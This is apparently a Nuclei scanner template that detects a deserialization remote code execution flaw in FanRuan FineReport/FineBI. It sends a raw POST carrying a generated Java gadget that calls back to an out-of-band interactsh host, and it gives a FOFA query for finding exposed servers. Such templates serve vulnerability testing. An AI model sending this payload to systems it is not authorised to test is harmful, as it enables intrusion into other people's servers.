http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST /webroot/decision/remote/design/channel HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/octet-stream


    {{generate_java_gadget("dns", "http://{{interactsh-url}}", "gzip")}}

    '
id: fanruan-deserialization
info:
  author: Co5mos
  description: The FineReport/FineBI channel interface can accept serialized data
    and deserialize it. Working in conjunction with the FanRuan built-in CB chain
    may lead to arbitrary code execution.
  metadata:
    fofa-query: "app=\"\u5E06\u8F6F-FineReport\""
    max-request: 2
    verified: true
  name: Fanruan Deserialization - Remote Code Execution
  reference:
  - https://blog.csdn.net/qq_51295677/article/details/131789320
  severity: critical
  tags: finereport,rce
